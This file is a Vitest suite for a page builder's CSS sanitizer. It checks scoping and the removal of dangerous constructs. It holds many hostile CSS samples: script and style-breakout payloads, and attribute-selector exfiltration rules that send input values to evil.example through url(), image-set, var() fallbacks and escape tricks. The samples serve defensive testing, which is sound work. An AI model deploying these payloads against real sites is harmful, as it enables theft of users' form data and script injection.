import { describe, it, expect } from "vitest";

import {
  MAX_RULE_NESTING,
  MAX_VALUE_NESTING,
  sanitizeBlockCss,
  sanitizeCustomCss,
} from "./css-sanitize";

const SCOPE = "nx-pb-page-abc";

/** `.n1 { .n2 { … { body } } }`, nested exactly `depth` rules deep. */
const nestRule = (depth: number, body: string): string => {
  let css = body;
  for (let i = depth; i >= 1; i -= 1) css = `.n${i} { ${css} }`;
  return css;
};

/** The sanitized CSS alone; the warnings have their own suite below. */
const clean = (css: string, scope: string): string =>
  sanitizeCustomCss(css, scope).css;
const cleanBlock = (css: string, scope: string): string =>
  sanitizeBlockCss(css, scope).css;

describe("sanitizeCustomCss", () => {
  it("scopes a simple rule under the page root", () => {
    const out = clean(".hero { color: red }", SCOPE);
    expect(out).toContain(`.${SCOPE} .hero`);
    expect(out).toContain("color:red");
  });

  it("drops declarations with javascript: / expression()", () => {
    const js = clean(".a { background: url(javascript:alert(1)) }", SCOPE);
    expect(js.toLowerCase()).not.toContain("javascript:");
    const expr = clean(".a { width: expression(alert(1)) }", SCOPE);
    expect(expr.toLowerCase()).not.toContain("expression(");
  });

  it("strips @import", () => {
    const out = clean('@import url("evil.css"); .a { color: red }', SCOPE);
    expect(out.toLowerCase()).not.toContain("@import");
    expect(out).toContain(`.${SCOPE} .a`);
  });

  it("cannot end the style element it is emitted into", () => {
    // The property that matters, stated directly. An earlier version of this
    // test asserted that the text "<script" was absent, which described how the
    // sanitizer happened to work rather than what it guarantees: it stripped
    // four literal tag spellings and did nothing about `<img onerror=…>`.
    //
    // Nothing can close the element now, so markup left in the text is inert:
    // inside a `<style>`, only `</style` ends the raw-text run. `<` is not
    // escaped wholesale because `@media (400px<width)` is valid CSS and
    // escaping there would break the query.
    const out = clean(
      ".hero { color: red } </style><script>alert(1)</script>",
      SCOPE
    );
    expect(out).not.toContain("</style");
    expect(out).not.toContain("</script");
    expect(out).toContain(`.${SCOPE} .hero`);
  });

  it("escapes markup an author hid behind a CSS escape", () => {
    // `csstree.generate` decodes escapes, so this reaches the page as literal
    // `</style>` even though the source contains no markup. Filtering the input
    // cannot see it; only the generated text can.
    const out = clean(
      `.a { content: "\\3c /style>\\3c img src=x onerror=alert(1)>" }`,
      SCOPE
    );
    expect(out).not.toContain("</style");
    expect(out).toContain("\\3c /style>");
  });

  it("keeps an escaped sequence meaning the same thing", () => {
    // `\3c` and `<` are one character to a CSS parser, so the author still gets
    // what they wrote; only the bytes the HTML parser sees change.
    expect(clean(`.a { content: "</div>" }`, SCOPE)).toContain(
      `content:"\\3c /div>"`
    );
  });

  it("leaves the angle brackets that valid CSS needs", () => {
    expect(clean(".a > .b { color: red }", SCOPE)).toContain(".b{color:red}");
    const range = clean(
      "@media (400px < width < 800px) { .a { color: red } }",
      SCOPE
    );
    expect(range).toContain("400px < width < 800px");
  });

  it("scopes a rule without rewriting what is inside a pseudo-class", () => {
    // `:not()`, `:is()` and `:has()` hold selectors of their own. Prefixing
    // those asks a different question than the author did: `.a:has(> .b)`
    // scoped inside becomes `.a:has(.scope > .b)`, which no longer means "has a
    // child .b".
    expect(clean(".a:not(.b) { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a:not(.b){color:red}`
    );
    expect(clean(".a:is(.b, .c) { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a:is(.b,.c){color:red}`
    );
    expect(clean(".a:has(> .b) { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a:has(>.b){color:red}`
    );
  });

  it("scopes every part of a selector list", () => {
    expect(clean(".a, .b { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a,.${SCOPE} .b{color:red}`
    );
  });

  it("preserves @media and scopes the rules inside it", () => {
    const out = clean("@media (max-width: 640px) { .a { color: red } }", SCOPE);
    expect(out).toContain("@media");
    expect(out).toContain(`.${SCOPE} .a`);
  });

  it("does not throw on malformed CSS and still scopes recoverable rules", () => {
    const out = clean(".a { color: red }}} .b { x: 1 }", SCOPE);
    expect(typeof out).toBe("string");
    expect(out).toContain(`.${SCOPE}`);
  });

  it("returns empty string for empty input", () => {
    expect(clean("", SCOPE)).toBe("");
  });
});

describe("sanitizeBlockCss", () => {
  it("rewrites the `selector` keyword to the block scope class", () => {
    const out = cleanBlock("selector { color: red; }", "nx-pb-abc");
    expect(out).toContain(".nx-pb-abc");
    expect(out).toContain("color:red");
    expect(out).not.toMatch(/(^|[^-.])selector\b/);
  });

  it("scopes descendant selectors under the block", () => {
    const out = cleanBlock(
      "selector .title { font-weight: 700; }",
      "nx-pb-abc"
    );
    expect(out).toContain(".nx-pb-abc");
    expect(out).toContain(".title");
  });

  it("scopes a bare selector under the block too", () => {
    const out = cleanBlock("p { margin: 0; }", "nx-pb-abc");
    expect(out).toMatch(/\.nx-pb-abc\s+p/);
  });

  it("drops dangerous declarations", () => {
    const out = cleanBlock(
      "selector { background: url(javascript:alert(1)); }",
      "nx-pb-abc"
    );
    expect(out).not.toContain("javascript");
  });

  it("does not double-scope a selector already prefixed with the block class", () => {
    // Written with the class already at the front, which is what the
    // already-scoped branch actually looks for. Passing `selector { … }` here
    // exercised the keyword rewrite instead and would have passed whether or
    // not that branch existed.
    const out = cleanBlock(".nx-pb-abc .title { color: red; }", "nx-pb-abc");
    expect(out).not.toMatch(/\.nx-pb-abc\s+\.nx-pb-abc/);
    expect(out).toContain(".nx-pb-abc .title");
  });
});

describe("custom CSS may not reach off this origin", () => {
  // The channel this closes: a selector that matches only on a prefix, plus a
  // URL that fires a request when it does, reads a value out one character at a
  // time. Custom CSS is the only surface where an author controls both.
  const EXFILTRATION = `input[value^="a"] { background: url("https://evil.example/a") }`;

  it("removes a declaration that fetches from another origin", () => {
    const out = sanitizeCustomCss(EXFILTRATION, SCOPE);
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
  });

  it("removes every scheme, not a list of the dangerous ones", () => {
    // The allowlist is "no scheme at all", so a scheme nobody thought to ban is
    // refused for the same reason as the ones they did.
    for (const url of [
      "https://evil.example/a.png",
      "http://evil.example/a.png",
      "//evil.example/a.png",
      "data:image/svg+xml,<svg/>",
      "chrome-extension://abc/x.png",
      "webcal://evil.example/x",
    ]) {
      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.css).not.toContain("data:");
      expect(out.warnings.length).toBeGreaterThan(0);
    }
  });

  it("reads a scheme spelled with CSS escapes", () => {
    // `csstree` decodes the URL, so the check sees what a browser would fetch
    // rather than what the author typed.
    const out = sanitizeCustomCss(
      `.a { background: url("\\68 ttps://evil.example/a") }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
  });

  it("reads a URL a function carries as a bare string", () => {
    // `image-set("…" 1x)` fetches the string. css-tree calls it a String rather
    // than a Url, so a walker looking only for Url nodes never sees it, and the
    // whole channel reopens through a spelling.
    for (const css of [
      `.a { background-image: image-set("https://evil.example/a.png" 1x) }`,
      `.a { background-image: -webkit-image-set("https://evil.example/a.png" 1x) }`,
      `.a { background: image("https://evil.example/a.png") }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("leaves a string that is text rather than an argument", () => {
    // The other half of that rule. A bare string is a caption, not a request,
    // and refusing it would break showing a URL on the page.
    for (const css of [
      `.a { content: "https://example.com" }`,
      `.a { font-family: "https://example.com" }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.warnings).toEqual([]);
    }
  });

  it("resolves backslashes the way a URL parser does", () => {
    // For http and https a backslash is a slash, so these reach another host
    // while beginning with neither `//` nor a scheme.
    // Four backslashes here is two in the CSS source, which is ONE after the
    // CSS string decodes — the literal backslash a URL parser reads as a slash.
    // Two in this file would be one in the source, where `\\e` is a CSS escape
    // for U+000E and reaches no host at all.
    for (const url of ["/\\\\evil.example/a", "\\\\\\\\evil.example/a"]) {
      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("reads a URL hidden in a custom property", () => {
    // A custom property holds an arbitrary token stream, so css-tree gives its
    // value as `Raw` and a walk over the parsed value sees nothing inside it.
    // The URL still fetches the moment anything says `var(--probe)`.
    const out = sanitizeCustomCss(
      `input[value^="a"] { --probe: url("https://evil.example/a"); background: var(--probe) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // The same reach, through a function rather than url().
    expect(
      sanitizeCustomCss(
        `.a { --x: image-set("https://evil.example/a" 1x) }`,
        SCOPE
      ).css
    ).not.toContain("evil.example");
  });

  it("reads a URL out of a var() fallback", () => {
    // css-tree puts a `var()` fallback in a nested `Raw`, so a check that only
    // re-parsed the value's ROOT missed it — and the browser substitutes the
    // fallback in and makes the request.
    const out = sanitizeCustomCss(
      `input[value^="a"] { background: var(--missing, url("https://evil.example/a")) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // Nested one level further, since the re-parse recurses.
    expect(
      sanitizeCustomCss(
        `.a { background: var(--x, var(--y, url("https://evil.example/a"))) }`,
        SCOPE
      ).css
    ).not.toContain("evil.example");
  });

  it("reads a URL substituted into a URL-taking function", () => {
    // `var()` is transparent: its fallback becomes whatever encloses the
    // `var()`, so this fetches even though the string's nearest function is
    // `var`. Position is decided by the nearest function that is NOT a
    // substitution.
    const out = sanitizeCustomCss(
      `input[value^="a"] { background-image: image-set(var(--missing, "https://evil.example/a.png") 1x) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // The same transparency must NOT make a caption's fallback a URL.
    expect(
      sanitizeCustomCss(
        `.a { content: var(--label, "https://example.com") }`,
        SCOPE
      ).warnings
    ).toEqual([]);
  });

  it("reads inside a nested rule, at every depth it follows", () => {
    // css-tree leaves a nested rule as a `Raw` child of its parent's block, so
    // a declaration-only walk never sees the URL inside it.
    for (const css of [
      `input[value^="a"] { .probe { background: url("https://evil.example/a") } }`,
      `.a { .b { .c { background: url("https://evil.example/a") } } }`,
      nestRule(MAX_RULE_NESTING, `background: url("https://evil.example/a")`),
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
    // And an ordinary nested rule survives untouched at any depth the scan
    // follows. The shallow cases are what people write; the last is the edge of
    // what the bound permits, which is where an off-by-one would show.
    for (const depth of [1, 2, 3, 5, MAX_RULE_NESTING]) {
      const out = sanitizeCustomCss(nestRule(depth, "color: red"), SCOPE);
      expect(out.warnings).toEqual([]);
      // Spacing is not normalised at every level: a nested rule is re-emitted
      // from the text the parser left it as, while the outermost declaration
      // goes through the generator. Both keep the declaration, which is the
      // property under test.
      expect(out.css.replace(/\s+/g, "")).toContain("color:red");
      expect(out.css).toContain(`.n${depth}`);
    }
  });

  it("reads inside a rule nested in a group at-rule", () => {
    // Both rules and at-rules have blocks, and a rule nested in either arrives
    // as `Raw`. A walk that read only `Rule` blocks missed this entirely: the
    // inner rule is a `Raw` child of the `@media`, not of the rule around it,
    // so the selector-plus-URL pair reached the page with no warning.
    for (const css of [
      `.nx-pb-page { @media (min-width:0px) { .probe:has(input[value^="a"]) { background:url("https://evil.example/a") } } }`,
      `.a { @supports (display:grid) { .probe { background:url("https://evil.example/b") } } }`,
      `.a { @media (min-width:0px) { @supports (display:grid) { .probe { background:url("https://evil.example/c") } } } }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
    // An ordinary rule nested in a group at-rule is untouched, which is the
    // common case and the cost of getting this wrong.
    const fine = sanitizeCustomCss(
      `.a { @media (min-width:0px) { color: red } }`,
      SCOPE
    );
    expect(fine.warnings).toEqual([]);
    expect(fine.css.replace(/\s+/g, "")).toContain("color:red");
  });

  it("reads a declaration written after a nested rule", () => {
    // CSS nesting allows declarations on either side of a nested rule, and
    // css-tree hands the whole block over as one `Raw`. Re-parsed as a
    // stylesheet the nested rule becomes a Rule and the trailing declaration
    // stays a top-level `Raw` belonging to no block, which a collector that
    // only looked inside blocks walked straight past.
    for (const css of [
      `input[value^="a"] { .child { color: red } background: url("https://evil.example/a") }`,
      `.a { .child { color: red } background-image: url("https://evil.example/b") }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
    // The same shape with nothing remote in it is untouched.
    const fine = sanitizeCustomCss(
      `.a { .child { color: red } color: blue }`,
      SCOPE
    );
    expect(fine.warnings).toEqual([]);
    expect(fine.css).toContain("color: blue");
  });

  it("refuses attr() where the value would be fetched", () => {
    // The URL never appears in the stylesheet: it arrives from a DOM attribute
    // at use time, so the scan has no literal to judge and a selector can make
    // the request conditional on a secret. Refused as unreadable rather than
    // as a remote URL, because no host was named.
    for (const value of [
      "background-image: image-set(attr(data-probe) 1x)",
      "background: -webkit-image-set(attr(data-probe) 1x)",
      "list-style-image: image(attr(data-probe))",
      "border-image-source: image-set(attr(data-probe) 1x)",
    ]) {
      const out = sanitizeCustomCss(`.a{${value}}`, SCOPE);
      expect(
        out.warnings.map(w => w.code),
        value
      ).toEqual(["unchecked"]);
      expect(out.warnings[0]?.message, value).toContain("attr()");
      expect(out.css, value).not.toContain("attr(");
    }
  });

  it("refuses url(attr(...)), which no parser can read as a URL", () => {
    // `url()` takes a URL token or a string, never a function, so this is a
    // parse error rather than an attr() the walk can see — and it is reported
    // as one. It is covered here because the outcome is what matters: the
    // declaration is removed either way, so the shape cannot reach the page
    // while being described by a different reason than the cases above.
    const out = sanitizeCustomCss(
      ".a{background-image: url(attr(data-probe))}",
      SCOPE
    );
    expect(out.warnings.map(w => w.code)).toEqual(["unchecked"]);
    expect(out.css).not.toContain("attr(");
  });

  it("leaves attr() alone where it is read as text", () => {
    // `content: attr(data-label)` is the ordinary, specified use and fetches
    // nothing. A refusal that fired on it would break the one thing attr() is
    // universally supported for.
    for (const value of [
      "content: attr(data-label)",
      'content: "x" attr(data-label) "y"',
      "font-family: local(attr(data-face))",
    ]) {
      const out = sanitizeCustomCss(`.a::before{${value}}`, SCOPE);
      expect(out.warnings, value).toEqual([]);
      expect(out.css, value).toContain("attr(");
    }
  });

  it("refuses attr() in a custom property, which can land anywhere", () => {
    // A custom property is checked as though its value could be used in any
    // position, because the declaration that uses it carries no literal of its
    // own to inspect.
    const out = sanitizeCustomCss(".a{--probe: attr(data-probe)}", SCOPE);
    expect(out.warnings.map(w => w.code)).toEqual(["unchecked"]);
    expect(out.css).not.toContain("attr(");
  });

  it("refuses nesting past the bound as unchecked, not as a URL", () => {
    // Rules deeper than the scan follows are still removed — unreadable is not
    // safe — but the reason given has to be the real one. Reporting them as
    // remote URLs sent authors looking for a host their CSS never named, and
    // fired on valid stylesheets: the deepest CSS in this repository nests five
    // levels, so a bound anywhere near that is hit by ordinary output.
    const out = sanitizeCustomCss(
      nestRule(MAX_RULE_NESTING + 1, "color: red"),
      SCOPE
    );
    expect(out.warnings.map(w => w.code)).toEqual(["unchecked"]);
    expect(out.warnings[0]?.message).toContain("levels deep");
    // Removed all the same, so a URL hiding below the bound never lands.
    const hidden = sanitizeCustomCss(
      nestRule(
        MAX_RULE_NESTING + 1,
        `background: url("https://evil.example/a")`
      ),
      SCOPE
    );
    expect(hidden.css).not.toContain("evil.example");
  });

  it("follows a var() fallback chain as deep as real ones go", () => {
    // A design-token stack walks `var()` through several tiers before it
    // bottoms out in a literal. Refusing those as remote URLs deleted valid
    // declarations and blamed a host that appears nowhere in them.
    for (const depth of [1, 2, 3, 4, 6, MAX_VALUE_NESTING]) {
      let inner = "red";
      for (let i = depth; i >= 1; i -= 1) inner = `var(--v${i}, ${inner})`;
      const out = sanitizeCustomCss(`.a { color: ${inner} }`, SCOPE);
      expect(out.warnings).toEqual([]);
      expect(out.css).toContain("red");
    }
  });

  it("refuses a remote-looking custom property, wherever it lands", () => {
    // `--probe: "https://evil"` is a bare string where it is DEFINED and an
    // image URL where it is used. Which it becomes is decided at the use, in a
    // declaration holding no string of its own to inspect, so nothing at
    // definition time can know — and it is refused rather than guessed at.
    const out = sanitizeCustomCss(
      `.a { --probe: "https://evil.example/a.png"; background-image: image-set(var(--probe) 1x) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // A custom property that is plainly not a URL is untouched, which is the
    // overwhelmingly common case and the cost of getting this wrong.
    expect(
      sanitizeCustomCss(`.a { --gap: 12px; padding: var(--gap) }`, SCOPE)
        .warnings
    ).toEqual([]);
  });

  it("treats attr() as a substitution, not as text", () => {
    // `attr()` looked text-taking because its fallback usually is text. But
    // `image-set(attr(x, "https://…") 1x)` consumes that fallback as an image,
    // so it inherits its position the way `var()` does.
    const out = sanitizeCustomCss(
      `.a { background-image: image-set(attr(data-probe, "https://evil.example/a.png") 1x) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // And a caption's fallback is still a caption.
    expect(
      sanitizeCustomCss(`.a { content: attr(data-label, "a caption") }`, SCOPE)
        .warnings
    ).toEqual([]);
  });

  it("leaves an ordinary fallback alone", () => {
    // The other side: most fallbacks are values, not URLs, and refusing them
    // would break the commonest use of `var()` there is.
    for (const css of [
      `.a { background: var(--bg, #fff) }`,
      `.a { color: var(--c, red) }`,
      `.a { --gap: 12px; padding: var(--gap) }`,
    ]) {
      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
    }
  });

  it("strips the leading controls a URL parser strips", () => {
    // "Remove any leading and trailing C0 control or space from input" — C0 is
    // U+0000 to U+001F, and `trim()` does not cover it, so a scheme behind
    // U+0001 survived while resolving to the same host.
    for (const escape of ["\\1 ", "\\8 ", "\\1f "]) {
      const out = sanitizeCustomCss(
        `.a { background: url("${escape}https://evil.example/a") }`,
        SCOPE
      );
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("removes the whitespace a URL parser removes", () => {
    // Tab and newline are stripped OUT of a URL by the parser, so `h<TAB>ttps:`
    // is fetched as `https:` while matching no scheme pattern.
    for (const escape of ["\\9 ", "\\a "]) {
      const out = sanitizeCustomCss(
        `.a { background: url("h${escape}ttps://evil.example/a") }`,
        SCOPE
      );
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("treats an unclassified function as able to fetch", () => {
    // The allowlist names the functions whose strings are TEXT. Anything else
    // is checked, so a function nobody has classified fails closed rather than
    // opening the channel by being new.
    const out = sanitizeCustomCss(
      `.a { background: some-future-fn("https://evil.example/a") }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
  });

  it("leaves a textual fallback alone", () => {
    // The other side of that allowlist. `attr()` and `counter()` take text, and
    // telling an author to upload a file because their caption looks like a URL
    // is a real cost for no security gain.
    for (const css of [
      `.a { content: attr(data-label, "https://example.com") }`,
      `.a { content: counter(x, "https://example.com") }`,
    ]) {
      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
    }
  });

  it("keeps the paths that resolve against this site", () => {
    for (const url of ["/media/hero.png", "./hero.png", "hero.png", "#frag"]) {
      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
      expect(out.css).toContain("background");
      expect(out.warnings).toEqual([]);
    }
  });

  it("says what went and offers a remedy that actually works", () => {
    // A declaration that vanished without explanation is the thing authors file
    // bugs about, and their own source still contains the line that did not
    // survive, so there is nothing to read back.
    //
    // The remedy has to be reachable, which "upload it to the media library"
    // was not: with a cloud storage adapter the media record's URL is itself
    // off-origin, so following that advice produced a URL this refuses again.
    const out = sanitizeCustomCss(
      `.a { background: url("https://fonts.example/x.woff2") }`,
      SCOPE
    );
    expect(out.warnings).toHaveLength(1);
    expect(out.warnings[0]?.message).toContain("background");
    expect(out.warnings[0]?.message).toContain("fonts.example");
    expect(out.warnings[0]?.message).toContain("same-origin path");
    expect(out.warnings[0]?.message).not.toContain("media library");
  });

  it("reports an at-rule it cannot support, rather than dropping it quietly", () => {
    const out = sanitizeCustomCss(
      `@import url("/local.css"); .a { color: red }`,
      SCOPE
    );
    expect(out.css).not.toContain("@import");
    expect(out.warnings.map(w => w.code)).toContain("unsupported-at-rule");
    expect(out.warnings[0]?.message).toContain("@import");
  });

  it("does not repeat one message for every rule that trips it", () => {
    const many = Array.from(
      { length: 5 },
      (_, i) => `.a${i} { background: url("https://evil.example/a") }`
    ).join("\n");
    const out = sanitizeCustomCss(many, SCOPE);
    expect(out.css).not.toContain("evil.example");
    // Same property, same URL: one message. Five identical lines teach nothing
    // and bury anything else the author needs to read.
    expect(out.warnings).toHaveLength(1);
  });

  it("reports through the per-block entry point too", () => {
    const out = sanitizeBlockCss(
      `selector { background: url("https://evil.example/a") }`,
      "nx-pb-abc"
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
  });
});
